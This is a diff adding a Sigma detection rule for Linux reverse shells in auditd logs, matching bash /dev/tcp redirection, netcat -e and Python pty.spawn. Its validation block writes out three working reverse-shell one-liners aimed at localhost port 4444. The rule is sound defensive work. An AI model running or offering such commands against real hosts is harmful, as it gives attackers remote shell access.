@@ -1,0 +1,47 @@
+title: Linux Reverse Shell Execution
+id: 7b1c4d20-9e3a-4f61-8a52-tyrian000037
+status: experimental
+description: >
+  Detects the three reverse shells that show up in almost every Linux intrusion:
+  bash writing to /dev/tcp, netcat with command execution, and a Python one-liner
+  that spawns a pty over a socket. auditd records argv split across EXECVE a0..aN,
+  so the payload lands in a2 when the shell is invoked as `sh -c '<payload>'`.
+references:
+  - https://attack.mitre.org/techniques/T1059/004/
+author: Tyrian
+date: 2026/08/03
+logsource:
+  product: linux
+  service: auditd
+detection:
+  bash_devtcp:
+    AuditKey: 'tyrian_exec'
+    ExecveA2|contains: '/dev/tcp/'
+  netcat_exec:
+    AuditKey: 'tyrian_exec'
+    Image|endswith:
+      - '/nc'
+      - '/ncat'
+      - '/netcat'
+      - '/nc.openbsd'
+      - '/nc.traditional'
+    ExecveA1|contains: '-e'
+  python_pty:
+    AuditKey: 'tyrian_exec'
+    ExecveA2|contains|all:
+      - 'socket'
+      - 'pty.spawn'
+  condition: bash_devtcp or netcat_exec or python_pty
+validation:
+  atomic: T1059.004
+  fire: |-
+    sh -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+    nc -e /bin/sh 127.0.0.1 4444
+    python3 -c 'import socket,pty;s=socket.socket();s.connect(("127.0.0.1",4444));pty.spawn("/bin/bash")'
+falsepositives:
+  - Administrators using netcat for legitimate port checks (rarely with -e)
+  - Monitoring scripts that health-check TCP ports through /dev/tcp
+level: critical
+tags:
+  - attack.execution
+  - attack.t1059.004
